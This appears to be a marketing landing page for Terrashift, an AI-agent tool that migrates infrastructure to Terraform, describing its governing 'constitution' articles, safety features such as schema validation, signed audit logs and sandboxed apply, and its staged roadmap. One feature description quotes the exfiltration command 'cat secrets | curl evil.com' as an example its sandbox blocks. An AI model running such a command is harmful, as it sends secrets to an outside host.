An interface for engineers, not operators.

The constitution

Thirteen articles, cited in every PR.

The rules Terrashift's contributors are bound by. Each article gets cited by name in commit messages and PR descriptions — reviewers link to "Article XIII rule 5" instead of re-explaining a concern.

↓ The thirteen articles · press → on a card to read the full text SOURCE · constitution.md
I
Architectural restraint
Of nine pipeline components, only three are agents. Adding another requires explicit RFC.
Operationalised by · pipeline.rs
II
Reference codebase discipline
Stakpak is the primary architectural reference. Every PR cites the section that informed it.
Operationalised by · PR template
III
AI safety
Every LLM-emitted attribute checked against live provider schema. Hallucinations are build breaks.
Operationalised by · libs/engine/validator
IV
Failure mode handling
Failures are loud. No silent fallbacks, no swallowed errors. unwrap() denied at workspace level.
Operationalised by · clippy.toml
V
Credentials and security
No long-lived credentials in process memory. LLM never sees raw secrets — references resolved at the boundary.
Operationalised by · libs/creds
VI
Knowledge layer integrity
Provider schemas version-pinned per migration. Same migration today produces same output in 2027.
Operationalised by · libs/knowledge
VII
Repository hygiene
Trunk-based. PRs ≤500 lines preferred. Article cited in description, sections referenced in code comments.
Operationalised by · CI
VIII
Stage gates
No parallel stage development. Adding agentic complexity in stage N+1 cannot inflate happy-path cost >1.3×.
Operationalised by · eval suite
IX
Data governance
Audit logs and migration outputs are user property. Archival, never deletion. Append-only.
Operationalised by · libs/audit
X
Observability
Every LLM call, tool invocation, phase transition gets a tracing span. No println! in production paths.
Operationalised by · tracing crate

Amendments
The constitution is amended by RFC. Major version bumps require team consensus.

Token economy
Per-tier cost ceilings, cache-first, >30% regression blocks merge. Customers pick model; we guarantee no drift.
Operationalised by · libs/eval

Why it's different

Six things most "AI infra" tools skip.

The hard problems aren't writing HCL. They're proving the migration is safe, reproducible, and reversible — without burning a small fortune in tokens. Each one taken seriously.

01 / VI

Validator on the path

Every LLM-emitted attribute checked against live provider schema before HCL is written. Hallucinations are build breaks, not runtime warnings. libs/engine/validator is the single enforcement point.

Article III →
02 / VI

Audit, signed end to end

Every tool call, phase transition, credential resolution writes a hash-chained, Ed25519-signed entry. Compliance reviewers can answer which model produced this artifact? deterministically — six months later.

Article V →
03 / VI

BYOK with five-layer override

Operator default → profile → CLI flag → in-conversation → per-call. In v0.1.0: any OpenAI-compatible endpoint — OpenAI, Groq, Together, Anyscale, your corporate proxy. Anthropic, Gemini, and Bedrock providers are scaffolded modules — activated in Stage 2. Resolved at runtime, never compile-time.

Section 6.X →
04 / VI

Sandboxed by default

terraform apply runs inside a Docker sandbox with command-level approvals via tree-sitter. cat secrets | curl evil.com doesn't slip through as one approved command. Short-lived federated tokens, zeroized after use.

XIII rule 6 →
05 / VI

Reversible by construction

Every file modification preceded by move to .backup/{run_id}/. Discard a plan — restoration is one cp. In v0.1.0: if apply fails, the run halts cleanly with the backup ready to restore. The Recovery agent kernel (run_agent + ApprovalStateMachine + retry) is in place; the bounded ReAct loop wires up in Stage 2.

Article V →
06 / VI

Reproducible six months later

Provider schemas version-pinned per migration. Same inputs today produce same outputs in 2027. No "latest" anywhere in production paths. CI regression gate catches silent cost drift.

Article VI →

Roadmap

Six stages, shipped in sequence.

Each stage has an exit gate. No parallel development. Article VIII: stages don't ship until the prior stage's eval suite passes — and at no transition can happy-path migration cost increase by more than 1.3×.

From the engineering log

Why we mirror an upstream kernel.

Most agent frameworks die at scale because they're prototypes shipped to production. Stakpak's agent core has been hardened across 295 branches — we inherit eleven trait boundaries, the secret-substitution pattern, the reversible-file wrapper, and ten codified anti-patterns.

We don't fork. We mirror the architecture document and re-implement domain-specifically. The stakpak_arch.md reference is the single source of truth for every migration the team makes.

We didn't reinvent the kernel. We borrowed one already battle-tested, then built a domain on top. — Architecture document, section 3.2
